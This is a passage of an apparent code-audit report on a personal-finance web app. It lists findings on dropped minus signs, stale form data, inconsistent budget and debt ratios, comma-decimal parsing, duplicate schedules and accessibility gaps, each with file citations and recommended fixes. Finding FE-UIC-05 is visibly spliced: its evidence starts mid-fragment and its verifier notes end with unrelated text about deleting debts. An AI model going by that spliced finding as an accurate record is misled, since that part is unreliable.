In steady state HybridAdapter.list returns the cache and swallows background pull errors (hybridAdapter.ts:121-128), and getProfile/getRates fall back to the cache on error (hybridAdapter.ts:323-345). So while every cloud call fails and navigator.onLine is true, the badge reads 'Synced · just now' (SyncStatusBadge.ts…

### FE-UIC-04 · MEDIUM · fmt() drops the sign: overdrafts, negative nets and negative net worth render as positive

- **Slice:** Money screens and entity forms · **Category:** money-correctness · **Auditor severity:** high · **Verification:** confirmed (adversarial: confirmed)
- **Where:** `react/src/lib/format.ts:152-154`, `react/src/pages/Accounts.tsx:56-57`, `react/src/pages/Accounts.tsx:170-171`, `react/src/pages/Accounts.tsx:196`, `react/src/components/accounts/AccountFormModal.tsx:259`, `react/src/components/accounts/ReconcileSheet.tsx:71`, `react/src/pages/NetWorth.tsx:196`, `react/src/pages/NetWorth.tsx:231`, `react/src/pages/NetWorth.tsx:305`, `react/src/pages/Transactions.tsx:508`, `react/src/pages/Transactions.tsx:547`, `react/src/pages/Transactions.tsx:615`, `react/src/components/charts/ReportCharts.tsx:125`, `react/src/components/charts/ReportCharts.tsx:248-252`, `react/src/components/dashboard/StartingBaselineBand.tsx:62`
- **Evidence:** `fmt` does `const n = Math.abs(amount || 0)`. The Accounts helper `signedMoney` only adds '−' for `a.kind === 'credit_card'`, so a bank row with a negative balance renders `fmt(balance)`. The same applies to the Cash in Hand figure (`fmt(view.balances.get(...))`), the Bank group total (`fmt(view.bankTotal)`), the account editor balance, and the reconcile 'Vyact says'. Net Worth shows `= Net worth {fmt(nw, c)}`, the liquidity group headers use `fmt(groupTotal)` and 'Money you can reach' uses `fmt(Math.round(la))`. Transactions month headers and the net use `{net >= 0 ? '+' : ''}{fmt(net)}`, so a negative value gets no minus at all. NetBarChart and NetWorthHistory y-axis ticks use fmtShort (also abs), so the negative half of the axis is labelled positive, and the history tooltip uses fmt. The Money component prefixes '−' correctly, so the same number shows with different signs on the same screen.
- **Failure scenario:** A bank account added with a ₹0 opening balance and ₹5,000 of logged spends has a balance of −₹5,000. The Accounts row and the Bank group show '₹5,000' (the only hint is that the card branch is skipped), while 'Spendable now' (Money) shows −₹5,000. A household with net worth −₹2,00,000 sees '= Net worth ₹2,00,000' in the waterfall. A month with ₹12,000 net outflow shows '₹12,000' in red with no minus, and the Saved-vs-Overspent axis labels −₹20K as '₹20K'.
- **Recommendation:** Add one UI helper (for example `fmtSigned` from lib/format, already used in Reports) and use it, or <Money>, for every balance or net that can cross zero. Fix signedMoney in Accounts to sign any negative balance, and fix the chart tickFormatters and tooltips. Add a lint/grep gate that flags `fmt(` applied to balance/net identifiers. Test: render Accounts and NetWorth with a negative bank balance and negative net worth and assert the '−' prefix appears.
- **Verifier notes:** adversarial (confirmed): fmt/fmtShort take Math.abs (format.ts:154,186). Accounts.tsx:56-57 signs only cards; :171 cash and :196 bank total use raw fmt; NetWorth.tsx:196 '= Net worth' and :231 too; Transactions.tsx:508,547,615 add only '+'; ReportCharts y-axes abs. Display-only, and red colour plus nearby <Money> partly cue the sign, so medium.
- **Also reported as:** INT-TZC-06 (Negative balances and nets render without a minus sign (fmt takes Math.abs))

### FE-UIC-05 · MEDIUM · Transaction edit picks the account from stale extras.paymentMethod and clears the FK

- **Slice:** Money screens and entity forms · **Category:** data-integrity · **Auditor severity:** medium · **Verification:** confirmed (adversarial: confirmed)
- **Where:** `react/src/components/transactions/TransactionFormModal.tsx:265-271`, `react/src/components/transactions/TransactionFormModal.tsx:386-402`, `react/src/store/slices/dataSlice.ts:523-533`, `react/src/lib/supabaseAdapter.ts:212-214`, `supabase/migrations/20260910150000_r2_accounts_card_metadata_delete_guard.sql:248-251`, `react/src/store/slices/crudSlice.ts:354-364`, `supabase/migrations/20260911120000_r4_investments_to_assets.sql:158-163`, `react/src/lib/hybridAdapter.ts:244-256`

''`, so the display-only extras value takes priority over the real FK. move_account_and_delete updates only `account_id`/`to_account_id` (the local path likewise spreads `...t` and changes only the ids), so a moved row keeps `paymentMethod: 'asset:<deletedId>'`. - **Failure scenario:** The user moves 'Old HDFC' history into 'HDFC Salary' and deletes it, then edits the note on a moved ₹1,200 expense. Cloud mode: the cache now holds the expense with no account, so HDFC Salary shows ₹1,200 too much until the next refresh. The cloud rejects the write (23514), it dead-letters with no UI, and the user's edit silently disappears on refresh. Local-only mode: the expense debits no account for good and Net Worth is overstated by ₹1,200.
- **Recommendation:** Seed the form from the FKs (expense/transfer: accountId; income: toAccountId; investment: accountId/toAccountId), encoded through the account list, and use paymentMethod only for legacy rows with no FK. Have move_account_and_delete (and the local path) also rewrite extras.paymentMethod. Test: a store test that moves an account, edits a moved row through the form payload, and asserts that account_id equals the destination.
- **Verifier notes:** adversarial (confirmed): TransactionFormModal.tsx:271 seeds paymentMethod from extras before accountId; :640 shows the stale value as a '(legacy)' option, so validation at :364 passes. The literal (:390-406) sends no accountId, dataSlice.ts:530-533 resolves undefined, and txnToRow writes account_id null, which breaks ck_txn_accounts_by_type (r4 migration:158). move_account_and_delete (r2:248-251) never rewrites extras.paymentMethod. Refuse to delete a debt that has loan_payment_events or a linked loan account (a DB trigger like assets_refuse_delete_in_use, mirrored in the store). Test: a fixture with a card account and a loan where the Debts total, the Net Worth list sum and projection.totalLiabilities are equal, plus a test that deleting a debt with EMI history is rejected.

### FE-UIC-07 · MEDIUM · DTI and 'Kept this month' ratios use all-time income and a fake 1 when income is zero

- **Slice:** Money screens and entity forms · **Category:** money-correctness · **Auditor severity:** medium · **Verification:** confirmed (adversarial: confirmed)
- **Where:** `react/src/pages/Debts.tsx:35-38`, `react/src/pages/Debts.tsx:117`, `react/src/pages/NetWorth.tsx:88-89`, `react/src/pages/NetWorth.tsx:110`, `react/src/pages/NetWorth.tsx:253-259`, `react/src/pages/Dashboard.tsx:85`
- **Evidence:** Debts: `income = transactions.filter(type==='income').reduce(...) || 1` covers ALL history (including private rows and full split totals), then `dti = totalMinPay / (income / 12) * 100`. The Dashboard computes DTI from this month's income, a different definition. Net Worth: `monthlyIncome = income || 1` and `savingsRatio = ((monthlyIncome - expense) / monthlyIncome) * 100`.
- **Failure scenario:** Three years of ₹1,00,000/month salary and ₹30,000 of minimum payments give a Debts DTI of 30,000 / (36,00,000/12) = 10% (green), while the true figure is 30% and the Dashboard shows 30%. With one month of data the Debts DTI is 360%. On the 2nd of a month with no salary yet and ₹5,000 spent, Net Worth shows 'Kept this month −499,900.0%'.
- **Recommendation:** Compute DTI once from a completed-months income basis (like spendBasis) in a shared selector used by both the Dashboard and Debts. When there is no income, render '—' ('no income recorded this month') instead of dividing by 1. Test: unit tests for 0 income and for multi-year history asserting the same DTI on both screens.
- **Verifier notes:** adversarial (confirmed): Debts.tsx:36-38 divides by all-time income/12, with a `|| 1` fallback. Dashboard.tsx:85 uses this month's income and 0 when there is none. NetWorth.tsx:89 sets monthlyIncome = income || 1, so :110 savingsRatio becomes ((1−expense)/1)*100 on a month with no income: a huge negative 'Kept this month'. The code matches the scenario exactly.
- **Also reported as:** FE-MNY-07 (Debts page debt-to-income divides ALL-TIME income by 12 and defaults to 1 when there is n…)

### FE-UIC-08 · MEDIUM · Three screens compute 'budget left/over' on different bases

- **Slice:** Money screens and entity forms · **Category:** money-correctness · **Auditor severity:** medium · **Verification:** confirmed (adversarial: confirmed) · **Known:** 2026-09 audit F5 (related; allocation consistency)
- **Where:** `react/src/pages/Budgets.tsx:68-82`, `react/src/pages/Budgets.tsx:127-154`, `react/src/pages/Dashboard.tsx:112-123`, `react/src/pages/Dashboard.tsx:270-279`, `react/src/lib/budgetTrends.ts:60-66`
- **Evidence:** Budgets.tsx: `totalBase = convert(b.limit)` (the total, including the unallocated 'flexible' part), but `spent = allocs.reduce(... a.spent)` counts only allocated categories, and the hero shows `remaining = totalBase - spent`. Dashboard pace compares `row.limit` with `month.expense` (all spend). Reports budgetTrends uses budgeted = the sum of allocations and actual = allocated-category spend. Dashboard budget lines also include annual allocations (`budgetLinesForMonth` keeps scope 'annual') but compare them with THIS month's spend (`spend[line.category]`).
- **Failure scenario:** October limit ₹50,000 with Food ₹10,000 and Rent ₹20,000 allocated. Spend: Food ₹9,000, Rent ₹20,000, Shopping (unallocated) ₹18,000. Budgets hero: '₹21,000 left · on pace' (58%). Dashboard on 15 Oct: 'running hot ₹22,806 over budget pace'. Reports: budgeted ₹30,000, actual ₹29,000. An annual Travel allocation of ₹1,20,000 with ₹1,10,000 spent year to date shows 25% green on the Dashboard because only October's ₹30,000 is counted.
- **Recommendation:** Define one budget-progress function (limit vs which spend) in lib and use it on Budgets, Dashboard, Reports and Pip. If unallocated spend counts against the total, include it in Budgets.tsx `spent`. Compare annual lines over their own period. Test: one fixture asserting identical remaining/over figures from all three call sites.
- **Verifier notes:** adversarial (confirmed): Budgets.tsx:79-80: totalBase is the full limit but spent sums only allocated categories; BudgetFormModal.tsx:263 allows an unallocated 'flexible' remainder. Dashboard.tsx:112-123 compares the limit with all of month.expense. budgetTrends.ts:61-63 uses the sum of allocations. budgetLinesForMonth (calculations.ts:144) keeps annual lines, and Dashboard.tsx:274 compares them with this month's spend.

### FE-UIC-09 · MEDIUM · Edit forms rebuild rows from form fields, erasing loan tenure, payment log and links

- **Slice:** Money screens and entity forms · **Category:** data-integrity · **Auditor severity:** medium · **Verification:** confirmed-with-caveats (adversarial: partial) · **Known:** 2026-09 audit F7 (still open for Debt/Split/Asset forms; transactions now carry updated_at)
- **Where:** `react/src/components/debts/DebtFormModal.tsx:104-120`, `react/src/lib/supabaseAdapter.ts:331-335`, `react/src/lib/amortization.ts:126`, `react/src/lib/amortization.ts:199-241`, `react/src/components/transactions/TransactionFormModal.tsx:388-428`, `react/src/lib/supabaseAdapter.ts:216-217`, `react/src/components/splits/SplitFormModal.tsx:303-316`, `react/src/components/assets/AssetFormModal.tsx:126-136`
- **Evidence:** DebtFormModal saves a fresh `debt` object with no remainingMonths, paymentLog or updated_at, and debtToRow writes `extras: { tenureMonths, remainingMonths: d.remainingMonths, paymentLog: d.paymentLog }`, so both become undefined. amortization reads `debt.remainingMonths ?? debt.tenureMonths` and appends to `debt.paymentLog`. The transaction form's literal omits recurringScheduleId and debtId, and txnToRow writes `recurring_schedule_id: fkOrNull(t.recurringScheduleId)` and `debt_id: fkOrNull(t.debtId)` as null. SplitFormModal's literal omits excluded, note and updated_at. AssetFormModal's non-folding branch omits updated_at, so these edits are last-write-wins.
- **Failure scenario:** A loan with tenure 60, re-amortised to 27 remaining months: the user renames it, remainingMonths is erased, and the next EMI's interest/principal split is computed over 60 months, so the interest expense recorded is wrong and the payoff history is lost. Editing a schedule-posted bill unlinks it from its schedule. Editing a private (excluded) split re-includes it in totals. Two members editing the same debt overwrite each other.
- **Recommendation:** Hydrate from `initial` and save `{...initial, ...changedFields, updated_at: initial.updated_at}` in Debt/Split/Asset/Transaction forms. Alternatively, make the row mappers write extras keys only when defined (the accountToRow/assetToRow pattern). Test: for each form, a round-trip test that a no-op edit leaves every persisted column byte-identical.
- **Verifier notes:** adversarial (partial): Field loss is real. DebtFormModal.tsx:104-120 omits remainingMonths and paymentLog, and debtToRow (supabaseAdapter.ts:331-335) replaces extras whole, so record_loan_payment (20260909140000:111) falls back to tenureMonths−1. The txn and split literals drop recurringScheduleId, debtId and excluded. Overstated: EMI interest is balance×rate (:97), not tenure-based, so the claimed wrong interest split does not happen.

### FE-UIC-10 · MEDIUM · Amount inputs strip the decimal comma: '12,50' is saved as 1250

- **Slice:** Money screens and entity forms · **Category:** money-correctness · **Auditor severity:** medium · **Verification:** confirmed (adversarial: confirmed)
- **Where:** `react/src/components/ui/NumericKeypad.tsx:9-18`, `react/src/components/ui/NumericKeypad.tsx:33-37`, `react/src/lib/accountsView.ts:258-263`, `react/src/components/accounts/AccountFormModal.tsx:269-270`, `react/src/components/accounts/AccountFormModal.tsx:398`, `react/src/components/accounts/ReconcileSheet.tsx:126-127`
- **Evidence:** AmountField is `type="text" inputMode="decimal"` and runs `sanitizeAmount`, which does `raw.replace(/[^0-9.]/g, '')`. parseAmountInput (account balance, card limits, reconcile) does `raw.replace(/,/g, '')`. On iOS/Android in comma-decimal locales the decimal keypad shows ',' as the separator. Nothing tells the user the separator was dropped.
- **Failure scenario:** A user in Germany, Brazil or Indonesia types an expense of 12,50 €, which is stored as 1250 €. Typing an opening balance of '1.234,56' gives 1.23 via sanitizeAmount, or NaN/1.23456 paths in other inputs. A household 'anywhere' gets amounts wrong by 100x with no warning.
- **Recommendation:** Parse with the locale's decimal separator (Intl.NumberFormat parts for the household/browser locale). Accept ',' as the decimal mark when it is the last separator with 1–2 trailing digits. Route every money input through one parser shared by AmountField and parseAmountInput. Test: sanitize/parse cases for '12,50', '1.234,56', '1,234.56' and '₹1,23,456.78'.
- **Verifier notes:** adversarial (confirmed): NumericKeypad.tsx:10 sanitizeAmount strips every character except digits and '.', so '12,50' becomes '1250' with no warning. accountsView.ts:259 parseAmountInput deletes all commas. AmountField (type=text, inputMode=decimal) feeds the Transaction, Budget, Split and Recurring forms. This is a 100x error for users on comma-decimal keyboards, e.g. iOS in a de/pt locale. Limited to those locales.

### FE-UIC-12 · MEDIUM · Net Worth and Debts forms invite re-entering Accounts money; spendable figures diverge

- **Slice:** Money screens and entity forms · **Category:** money-correctness · **Auditor severity:** medium · **Verification:** confirmed-with-caveats (adversarial: partial) · **Known:** 2026-09 audit F3 (structural remainder)
- **Where:** `react/src/components/assets/AssetFormModal.tsx:43-50`, `react/src/components/assets/AssetFormModal.tsx:207`, `react/src/constants.ts:145-148`, `react/src/components/debts/DebtFormModal.tsx:41-45`, `react/src/lib/netWorth.ts:79-89`, `react/src/lib/accountBalance.ts:169-180`, `react/src/pages/Accounts.tsx:92`, `react/src/lib/accountsView.ts:176-188`, `react/src/pages/NetWorth.tsx:229-236`, `react/src/lib/netWorth.ts:126`
- **Evidence:** Add Asset defaults to `type: 'savings', liquidity: 'liquid'` (types also include cash/checking), with the placeholder 'e.g. Chase Savings'. Add Debt defaults to `type: 'credit_card'`. Unlinked assets and debts are summed as-is (`assets.filter(a => !linkedAssetIds.has(a.id))`, `debts.filter(d => !linkedDebtIds.has(d.id))`), so a static 'Savings' asset or a 'credit card' debt sits beside the real bank/card Account. Accounts' 'Spendable now' (accountsSummary) counts only live bank/cash minus cards. Net Worth's 'free after card dues' and Pip's free-to-spend use liquidAssets, which includes liquid legacy assets and archived accounts (`isArchived: false` for valuation).
- **Failure scenario:** The user has an HDFC bank Account (₹50,000) and an HDFC card Account (owes ₹20,000), then follows the Net Worth and Debts prompts and adds 'HDFC Savings ₹50,000' and 'HDFC card ₹20,000'. Net worth now double-counts both sides, and the static asset never moves with spending. Accounts says Spendable now ₹30,000, while Net Worth and Pip say ₹80,000 free after card dues. That is two answers to the same question, the v10.37 bug class.
- **Recommendation:** Remove cash/checking/savings asset types and the credit_card debt type from the forms (or redirect them to Add account), and default Debt type to a loan. Define 'free to spend' once (liquid − cardDues) and have Accounts' summary read the same projection, stating explicitly whether archived accounts are included. Test: a fixture asserting Accounts spendable equals the NetWorth/Pip free-to-spend figure.
- **Verifier notes:** adversarial (partial): The defaults are as cited: AssetFormModal.tsx:44 savings/liquid, constants.ts:146-148 cash/checking/savings types, DebtFormModal.tsx:44 credit_card. accountsSummary (accountsView.ts:180) skips archived accounts and legacy assets, while computeNetWorth sets isArchived:false (netWorth.ts:126) and counts liquid unlinked assets, so the spendable figures can differ. The double counting needs the user to re-enter balances…

### FE-UIC-13 · MEDIUM · Recurring Save has no in-flight guard or error handling; a double tap duplicates schedules

- **Slice:** Money screens and entity forms · **Category:** reliability · **Auditor severity:** medium · **Verification:** confirmed (adversarial: confirmed)
- **Where:** `react/src/pages/Recurring.tsx:134-197`, `react/src/pages/Recurring.tsx:339-342`, `react/src/store/slices/recurringSlice.ts:38`
- **Evidence:** `async function save()` awaits `upsert(schedule)` with no try/catch and no saving state. The footer button `<button type="button" onClick={save}>` is never disabled. For a new schedule, `{...(editing || {})}` has no id, so each call mints `id: s.id || uid()`. A rejected upsert becomes an unhandled rejection with no toast, and the sheet stays open with no feedback.
- **Failure scenario:** On a slow device (IndexedDB + outbox write) the user taps 'Save schedule' twice for a ₹25,000 auto-confirm rent. Two schedules are created and the engine posts ₹50,000 of rent every month until someone notices.
- **Recommendation:** Add a `saving` state that disables the button, wrap the save in try/catch with an error toast, and close only on success (the same pattern the other forms use). Test: an RTL test firing two clicks that asserts one upsertRecurring call.
- **Verifier notes:** adversarial (confirmed): Recurring.tsx:134-197: save() has no saving flag and no try/catch, and awaits upsert before closing. The button at :339 is never disabled. A new schedule spreads `editing || {}` with no id, and recurringSlice.ts:38 mints id: s.id || uid() on every call. A double tap during the async write creates two schedules (auto-confirm defaults true), and a rejected upsert gives no toast.

### FE-UIS-03 · MEDIUM · Re-running onboarding relabels household currency, duplicates bill schedules, and half-commits on error

- **Slice:** Shell, settings, onboarding, accessibility · **Category:** money-correctness · **Auditor severity:** high · **Verification:** confirmed-with-caveats (adversarial: partial)

- **Evidence:** Settings always shows 'Re-run onboarding wizard →' (Link to /onboarding). App.tsx renders <Onboarding/> for any household on that route, and Onboarding only bails out when the feature flag is off (it is on: config/features.ts `enabled: true`). The currency state is seeded from `navigator.language` (`includes('IN') ? 'INR' : includes('GB') ? 'GBP' : 'USD'`), not from profile.baseCurrency. `complete()` calls `await updateProfile({ baseCurrency: currency })` first, and the DB trigger `households_currency_to_accounts` does `update accounts set currency = new.base_currency`, a relabel with no conversion. `wireOnboardingToMoney` then adds a new recurring expense for every bill on every run, with no dedupe. `markCompleted` runs before the final `updateProfile({household: SEGMENT_TO_PROFILE[segment], ...})`, which can throw HOUSEHOLD_TYPE_TOO_SMALL (e.g. 'individual' becomes 'personal' on a 2-member household). `complete()` has try/finally with no catch, so the error is unhandled and the button re-enables; tapping again repeats the wiring. The Settings base-currency <Select> also triggers the same household-wide relabel on a single change event with no confirmation.
- **Failure scenario:** An INR household holds ₹50,000 opening cash and ₹1,20,000 in a bank account. The owner, on an en-US browser, re-runs the wizard and does not touch the pre-filled 'USD' currency. Every account becomes $50,000 / $1,20,000 while the INR transactions are converted at ~83/$, so net worth jumps from about $2,048 to about $170,000. In addition, Rent ₹25,000 is now scheduled twice on the 2nd. If the user picked 'individual' in a Couple household, the final step throws and a second tap schedules the bills a third time.
- **Recommendation:** Seed the currency from `profile.baseCurrency` whenever the household already exists, and never write baseCurrency from onboarding unless the user changed it, with an explicit confirmation that says balances are relabelled, not converted. Either refuse a re-run for a household with `onboardedAt`/data (send it to the per-entity editors) or make wiring idempotent: skip a bill whose category and amount already has an active schedule, and skip budget/paycheck if they exist. Map the segment to a type only when it fits `typeFits`, and keep a Couple household as couple. Wrap complete() in catch with a toast, and call markCompleted only after every write succeeds. Put a confirm dialog on the Settings base-currency select. Tests: re-run onboarding on a seeded INR household under navigator.language='en-US' and assert base currency and account currency are unchanged and the recurring schedule count is unchanged. Also test that an updateHousehold rejection leaves onboarding not completed and shows…
- **Verifier notes:** adversarial (partial): Core holds. Onboarding.tsx:86 seeds currency from navigator.language, line 151 writes it first, and the trigger (20260910120000:201-213) relabels accounts. onboardingWiring.ts bill loop has no dedupe. markCompleted runs before the type update, which can throw, with no catch. Mitigations: the re-run is a deliberate Settings action (Settings.tsx:399); the currency Select is visible at step 0; bills are autoConfirm:fal…

### FE-UIS-06 · MEDIUM · Settings saves household settings optimistically for non-owners; values revert, profile email is never saved

- **Slice:** Shell, settings, onboarding, accessibility · **Category:** data-integrity · **Auditor severity:** medium · **Verification:** confirmed (adversarial: confirmed)
- **Where:** `react/src/pages/Settings.tsx:256`, `react/src/pages/Settings.tsx:307`, `react/src/pages/Settings.tsx:362`, `react/src/pages/Settings.tsx:521`, `react/src/pages/Settings.tsx:591`, `react/src/lib/hybridAdapter.ts:314`, `react/src/lib/supabaseAdapter.ts:780`, `react/src/lib/supabaseAdapter.ts:805`, `react/src/store/slices/dataSlice.ts:650`, `supabase/migrations/00000000000001_production_state_baseline.sql:763`, `react/src/pages/Settings.tsx:275`, `react/src/pages/Settings.tsx:649`
- **Evidence:** In cloud mode `HybridAdapter.updateProfile` writes the cache, enqueues an outbox op and returns success, so `saveDebtPrefs` always toasts 'Debt preferences saved'. `SupabaseAdapter.updateProfile` writes payoff_strategy / extra_payment / language / base_currency to `households`, whose UPDATE policy is `role_in(id) = 'owner'`. For an admin or member the flush matches 0 rows, raises WriteNotAppliedError and the op dead-letters. The next `getProfile` (cloud-first) silently restores the old value. Settings renders these controls with no `can()` gate. The Profile 'Email' input is passed to `updateProfile({ name, email })`, but SupabaseAdapter maps no `email` field at all, so 'Profile saved' is shown while the email changes nowhere (not auth, not profiles). The backup labelled 'Full backup' (`backupSnapshot`) omits accounts, recurring schedules, budget allocations, splits and valuation logs, and in local-only mode it is the user's only copy ('download a backup to keep a copy').
- **Failure scenario:** An admin partner sets 'Monthly Extra Payment' to ₹5,000 and sees 'Debt preferences saved'. On the next refresh it is back to 0 and the payoff plan never used it, with nothing shown beyond a dead-letter count in the account menu. A user edits their email in Profile, sees 'Profile saved', and keeps receiving mail at the old address. A local-only user restores from 'Full backup' and has no accounts and no balances.
- **Recommendation:** Gate household-level fields (base currency, payoff strategy, extra payment, household language) behind `can(myRole,'edit_household_settings')` and show them read-only otherwise. Write household-level fields directly (as `updateHousehold` does) so RLS refusals surface as errors, not as queued optimism. Remove the Email input or wire it to `auth.updateUser({ email })` with the confirmation flow. Rename the backup to 'Partial snapshot' or include accounts, recurring, allocations and splits. Tests: a cloud-mode store test with role 'member' asserting saveDebtPrefs surfaces an error and does not toast success; a unit test that backupSnapshot contains every persisted entity list.
- **Verifier notes:** adversarial (confirmed): hybridAdapter.ts:314 caches + enqueues and returns success; supabaseAdapter.ts:803-808 updates households and throws WriteNotAppliedError on 0 rows; the policy at baseline.sql:763 is role_in(id)='owner' and is never superseded. Settings.tsx:307-310 toasts success with no can() gate. The adapter maps no email (only display_name etc.), yet Settings.tsx:259 toasts 'Profile saved'. backupSnapshot (275-281) omits account…

### FE-UIS-07 · MEDIUM · Notifications, household switcher, account menu and ⌘K are modal dialogs without focus trap or focus return

- **Slice:** Shell, settings, onboarding, accessibility · **Category:** accessibility · **Auditor severity:** medium · **Verification:** confirmed (adversarial: confirmed)
- **Where:** `react/src/components/ui/PullDownSheet.tsx:21`, `react/src/components/ui/PullDownSheet.tsx:41`, `react/src/components/ui/PullDownSheet.tsx:52`, `react/src/components/layout/CommandPalette.tsx:73`, `react/src/components/layout/AccountMenu.tsx:186`, `react/src/components/layout/HouseholdSheet.tsx:37`, `react/src/components/insights/ForYouReel.tsx:75`, `react/src/components/insights/EvergreenReel.tsx:78`
- **Evidence:** Audit 6.1 moved HalfSheet and Modal to Radix (AccessibleDialog). PullDownSheet, used by NotificationSheet, HouseholdSheet and the mobile AccountMenu, still hand-rolls `role="dialog" aria-modal="true"` with only a window Escape listener: no initial focus, no focus trap, no inert background, and no focus restore to the trigger. Its only close control is a `w-11 h-[5px]` button, the 5px grabber 6.1 called out. CommandPalette is the same pattern: `role="dialog" aria-modal="true"`, focus set via setTimeout, Tab escapes to the page, no restore, and the arrow-key 'selected' item is not exposed (no combobox / aria-activedescendant). ForYouReel and EvergreenReel declare aria-modal but never move focus into the reel.
- **Failure scenario:** A keyboard user opens the bell, presses Tab and lands on page controls hidden behind the scrim. A screen-reader user is told the dialog is modal while focus sits on content outside it. On close, focus drops to <body>, so they lose their place in the top bar. A touch user with limited dexterity has to hit a 5px-tall bar to close the account menu.
- **Recommendation:** Rebuild PullDownSheet on Radix Dialog (as AccessibleDialog does), keeping the top-anchored styling, with a ≥44px labelled close button. Move CommandPalette to Radix Dialog with an ARIA combobox/listbox (`aria-activedescendant` on the input, role=option rows). Have the reels focus their close button on mount and restore focus to the opener. Test: extend the AccessibleDialog Playwright/RTL tests to the notification sheet, household sheet and palette, asserting focus moves inside, Tab stays inside, and focus returns to the trigger on Escape.
- **Verifier notes:** adversarial (confirmed): PullDownSheet.tsx:21-28 only adds a window Escape listener and a body overflow lock. role=dialog aria-modal at :41, with no initial focus, trap or restore. The close control at :52 is w-11 h-[5px]. CommandPalette.tsx:73-77 uses the same hand-rolled aria-modal, with no trap and no aria-activedescendant. ForYouReel:75 and EvergreenReel:78 declare aria-modal without managing focus. It is used by AccountMenu.tsx:186, Ho…

### FE-UIS-08 · MEDIUM · Toasts are silent to screen readers and vanish in 3.2s; bottom banners cover the tab bar and Save

- **Slice:** Shell, settings, onboarding, accessibility · **Category:** accessibility · **Auditor severity:** medium · **Verification:** confirmed (adversarial: confirmed)
- **Where:** `react/src/components/ui/ToastHost.tsx:11`, `react/src/store/slices/syncSlice.ts:107`, `react/src/components/onboarding/NudgeBanner.tsx:90`, `react/src/components/layout/InstallBanner.tsx:76`, `react/src/components/layout/UpdateBanner.tsx:78`, `react/src/components/layout/MobileTabBar.tsx:40`, `react/src/components/ui/FormPage.tsx:115`, `react/src/pages/auth/SignIn.tsx:85`, `react/src/pages/auth/SignUp.tsx:124`
- **Evidence:** ToastHost renders toasts in a plain div with no role=status/alert or aria-live. Every success and error message in the app (including 'Could not delete account…', 'Verification failed…', sync and quota errors) is therefore never announced, and `setTimeout(dismissToast, action ? 6000 : 3200)` removes errors after 3.2s with no close button and no pause on hover. Inline auth errors (`{error && <div className="text-terra ...">`) are not role=alert either. NudgeBanner (`fixed bottom-4 inset-x-4 z-[120]`, mounted at App root on every route including form pages), InstallBanner (`bottom-4 ... z-[60]`), UpdateBanner (`bottom-4 z-[300]`) and ToastHost (`bottom-5 right-5 z-[999]`) all sit above MobileTabBar (`fixed bottom-0 z-40`) and the FormPage Save bar (`sticky bottom-0 z-20`), and none of them uses `env(safe-area-inset-bottom)`.
- **Failure scenario:** A VoiceOver user taps 'Update password'. The request fails, the error toast is never spoken and is gone 3.2s later, so they assume it worked. On a phone, the day-7 'check-in' nudge sits over the bottom tab bar and the centre '+' button, and on Add Transaction it covers the Save bar until dismissed (WCAG 2.4.11 Focus Not Obscured).
- **Recommendation:** Give ToastHost an `aria-live="polite"` region with errors in a separate `role="alert"` region. Keep error toasts until dismissed (or ≥10s) with a close button, and pause timers on hover/focus. Add role=alert to the inline auth error divs (or pass `error` through `<Field error>`). Stack bottom banners above the tab bar on mobile (`bottom: calc(env(safe-area-inset-bottom) + 76px)` below sm), suppress NudgeBanner and InstallBanner on form routes, and let only one bottom surface show at a time. Tests: RTL asserting toasts render inside a live region; a Playwright mobile-viewport test asserting the FormPage Save button and the tab bar '+' are not covered when a nudge is active (elementFromPoint).
- **Verifier notes:** adversarial (confirmed): ToastHost.tsx:11 is a plain div with no role or aria-live. syncSlice.ts:107 auto-dismisses after 3200ms, and there is no close button or pause. NudgeBanner:90 (bottom-4 z-[120]), InstallBanner:76 (z-[60]) and UpdateBanner:78 (z-[300]) are mounted app-wide in App.tsx:79-86, above MobileTabBar.tsx:40 (bottom-0 z-40). None of them offsets for the tab bar or the safe area.

### FE-UIS-09 · MEDIUM · Aurora secondary text and status colours fail WCAG AA contrast, most in light theme

- **Slice:** Shell, settings, onboarding, accessibility · **Category:** accessibility · **Auditor severity:** medium · **Verification:** confirmed (adversarial: confirmed)
- **Where:** `react/src/index.css:32`, `react/src/index.css:108`, `react/src/index.css:112`, `react/src/index.css:114`, `react/src/index.css:109`, `react/src/index.css:295`, `react/src/index.css:301`, `react/tailwind.config.ts:26`
- **Evidence:** `--ink-dim`/`--ff-ink-3` is #7A8A87 in Mist (light). On the canvas #E7EDEC that is about 3.05:1, and on the white elevated surface about 3.6:1. In Nocturne #6E827E on #0F181B it is about 4.4:1. `.mono-label` (10px uppercase, used for most form field labels and section captions) uses `color: var(--ff-ink-3)`, and `text-ink-dim` appears 342 times in .tsx files for hints, dates, statuses ('always on', 'Verification pending' context, policy dates). Light-theme status colours used as text are also below 4.5:1: honey #B98A38 about 2.6:1, sage #2E9E78 about 2.8:1, coral #E26D5C about 2.7:1 (text-honey/text-sage/text-coral appear 202 times, e.g. the 'Verification pending' and 'Email verified' badges and coral link text).
- **Failure scenario:** A user with low vision on the light theme cannot read the 10px field labels ('DISPLAY NAME', 'BASE CURRENCY'), the quiet-hours explanation, or the honey 'Verification pending' badge. This fails WCAG 1.4.3 (4.5:1 for text under 18.66px bold or 24px).
- **Recommendation:** Darken Mist `--ink-dim`/`--ff-ink-3` to at least #5F6E6B (about 4.6:1 on #E7EDEC) and lift Nocturne to about #7C918C. Add darker text variants for status colours in light theme (e.g. honey-ink #8A6420, sage-ink #1F7A5B, coral-ink #B8473A) and use them wherever the colour carries text. Keep the bright values for fills and icons. Add a token contrast unit test that computes WCAG ratios for every text token on --canvas, --elevated and --sunken in both themes and fails under 4.5.
- **Verifier notes:** adversarial (confirmed): index.css:112 and :149 set light --ink-dim/--ff-ink-3 to #7A8A87. Measured contrast is 3.05:1 on #E7EDEC and 3.61:1 on white. Dark #6E827E on #0F181B is 4.42:1. .mono-label (10px, :295-301) uses --ff-ink-3. Light honey #B98A38 is 2.62:1, sage #2E9E78 2.82:1 and coral #E26D5C 2.70:1 on the canvas. All are below 4.5:1.

### FE-UIS-10 · MEDIUM · Single-key shortcuts n/b/d/a ignore modifiers (hijack Cmd+A, Ctrl+D) and cannot be turned off

- **Slice:** Shell, settings, onboarding, accessibility · **Category:** accessibility · **Auditor severity:** medium · **Verification:** confirmed (adversarial: confirmed)
- **Where:** `react/src/hooks.ts:16`, `react/src/hooks.ts:19`, `react/src/hooks.ts:24`, `react/src/components/layout/Layout.tsx:24`
